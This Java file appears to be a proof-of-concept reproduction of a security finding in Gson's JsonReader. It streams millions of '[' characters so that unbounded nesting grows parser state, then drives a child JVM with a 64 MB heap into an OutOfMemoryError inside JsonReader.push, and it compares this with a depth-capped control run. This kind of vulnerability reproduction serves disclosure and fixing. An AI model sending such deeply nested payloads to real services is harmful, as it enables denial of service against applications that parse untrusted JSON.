package repro;

import com.google.gson.stream.JsonReader;
import com.google.gson.stream.JsonToken;

import java.io.BufferedReader;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Reader;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;

public class Repro {

  private static final int[] DEPTHS = {1_000_000, 2_000_000, 4_000_000};

  /**
   * Streams {@code count} '[' characters on demand and holds O(1) memory, so every byte of heap
   * growth measured below is JsonReader nesting state, not input buffering. An attacker's payload
   * of that many bytes is equivalent.
   */
  static final class BracketReader extends Reader {
    private long remaining;

    BracketReader(long count) {
      this.remaining = count;
    }

    @Override
    public int read(char[] cbuf, int off, int len) {
      if (remaining <= 0) {
        return -1;
      }
      int n = (int) Math.min((long) len, remaining);
      java.util.Arrays.fill(cbuf, off, off + n, '[');
      remaining -= n;
      return n;
    }

    @Override
    public void close() {}
  }

  private static long usedKb() {
    Runtime rt = Runtime.getRuntime();
    return (rt.totalMemory() - rt.freeMemory()) / 1024;
  }

  /** Reads the private stackSize field so the achieved nesting depth is measured, not guessed. */
  private static int stackSize(JsonReader r) throws Exception {
    Field f = JsonReader.class.getDeclaredField("stackSize");
    f.setAccessible(true);
    return (Integer) f.get(r);
  }

  /**
   * Baseline point: drive the public beginArray() API to the given depth over a streamed payload,
   * then measure retained heap while the parser state is still alive.
   */
  private static void depthPoint(int depth) throws Exception {
    JsonReader r = new JsonReader(new BracketReader(depth));
    long t0 = System.nanoTime();
    int maxStack = 0;
    for (int i = 0; i < depth; i++) {
      r.beginArray();
      maxStack++;
    }
    long ms = (System.nanoTime() - t0) / 1_000_000;
    System.gc();
    Thread.sleep(100);
    long heapKb = usedKb();
    System.out.printf(
        "depth=%,d  maxStackSize=%,d  timeMs=%,d  heapUsedKB(approx)=%,d%n",
        depth, maxStack, ms, heapKb);
    r.close();
    System.gc();
    Thread.sleep(100);
    System.out.printf("        after close, heapUsedKB(approx)=%,d (state released)%n", usedKb());
  }

  /**
   * Child-JVM phase: heap bounded to -Xmx64m, unbounded nesting. Runs until the JVM dies or
   * push()'s Arrays.copyOf fails to allocate.
   */
  private static void oomPhase() {
    System.out.println("oom-phase: parsing unbounded nested arrays on a -Xmx64m heap");
    JsonReader r = new JsonReader(new BracketReader(Long.MAX_VALUE));
    long depth = 0;
    try {
      while (true) {
        try {
          r.beginArray();
        } catch (IOException e) {
          System.out.println("oom-phase: unexpected IOException: " + e.getMessage());
          System.exit(1);
        }
        depth++;
        if (depth % 500_000 == 0) {
          System.out.println("oom-phase: depth " + depth + " reached, parser has not refused");
        }
      }
    } catch (OutOfMemoryError oom) {
      System.out.println(
          "oom-phase: java.lang.OutOfMemoryError: " + oom.getMessage() + " at depth ~" + depth);
      oom.printStackTrace();
      System.out.println(
          "oom-phase: heap exhausted by JsonReader nesting state; no depth limit stopped the parse");
      System.exit(2);
    }
  }

  /** Spawns the bounded-heap child and checks its output for the OOM inside JsonReader.push. */
  private static void spawnOomChild() throws Exception {
    String javaBin = System.getProperty("java.home") + "/bin/java";
    ProcessBuilder pb =
        new ProcessBuilder(
            javaBin,
            "-Xmx64m",
            "-cp",
            System.getProperty("java.class.path"),
            "repro.Repro",
            "oom");
    pb.redirectErrorStream(true);
    Process p = pb.start();
    List<String> lines = new ArrayList<>();
    try (BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
      String line;
      while ((line = in.readLine()) != null) {
        lines.add(line);
        System.out.println(line);
      }
    }
    int code = p.waitFor();
    System.out.println("oom-phase: child JVM exit code " + code);
    StringBuilder all = new StringBuilder();
    for (String l : lines) {
      all.append(l).append('\n');
    }
    String out = all.toString();
    boolean oomSeen = out.contains("java.lang.OutOfMemoryError: Java heap space");
    boolean inPush = out.contains("com.google.gson.stream.JsonReader.push");
    System.out.println("oom-phase: OutOfMemoryError observed in bounded-heap child: " + oomSeen);
    System.out.println(
        "oom-phase: allocation failure inside com.google.gson.stream.JsonReader.push: " + inPush);
    System.out.println(
        "oom-phase: heap exhaustion outcome "
            + (oomSeen && inPush ? "REPRODUCED" : "NOT reproduced"));
    if (!(oomSeen && inPush)) {
      System.exit(1);
    }
  }

  public static void main(String[] args) throws Exception {
    String mode = args.length > 0 ? args[0] : "baseline";

    if ("control".equals(mode)) {
      // Negative control: same traversal and the same streamed-input driver, but an upstream
      // nesting-depth cap of 256 cuts the payload before JsonReader enters push() growth
      // territory. The deep-nesting condition the finding blames is removed.
      int cap = 256;
      JsonReader r = new JsonReader(new BracketReader(cap));
      int maxStack = 0;
      boolean eof = false;
      while (!eof) {
        try {
          r.beginArray();
          maxStack++;
        } catch (EOFException e) {
          eof = true;
        }
      }
      System.out.println("control: deep-nesting condition removed (input capped at depth " + cap + ")");
      System.out.println("control: max stackSize " + maxStack + " (capped input; stream ends at " + cap + " brackets)");
      System.out.println("control: JsonReader.push() stack-doubling growth absent; no unbounded heap growth");
      System.out.println("control: no OutOfMemoryError");
      r.close();
      return;
    }

    if ("oom".equals(mode)) {
      oomPhase();
      return;
    }

    System.out.println("mode: " + mode);
    System.out.println("artifact: gson jar built from repo @ 828a97b (gson-parent-2.11.0)");
    System.out.println("input: streamed '[' characters (O(1) reader memory); heap growth is parser state only");
    for (int depth : DEPTHS) {
      depthPoint(depth);
    }
    System.out.println("effect: JsonReader state arrays (stack, pathIndices, pathNames) grow linearly");
    System.out.println("        with attacker-chosen nesting depth via push(); no depth is refused.");
    System.out.println("effect: now driving the same parse on a bounded heap until the outcome occurs:");
    spawnOomChild();
    System.out.println("effect: heap exhaustion reproduced: deep JSON nests until JsonReader.push()");
    System.out.println("        cannot allocate, terminating the process with OutOfMemoryError.");
  }
}
